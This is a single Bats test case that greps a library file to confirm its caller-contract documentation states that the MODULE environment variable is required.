@test "INVARIANT (lib's caller-contract states MODULE precondition — required-env-doc 86)" {
    grep -qE 'MODULE.*module slug|MODULE.*required' "${LIB}"
}
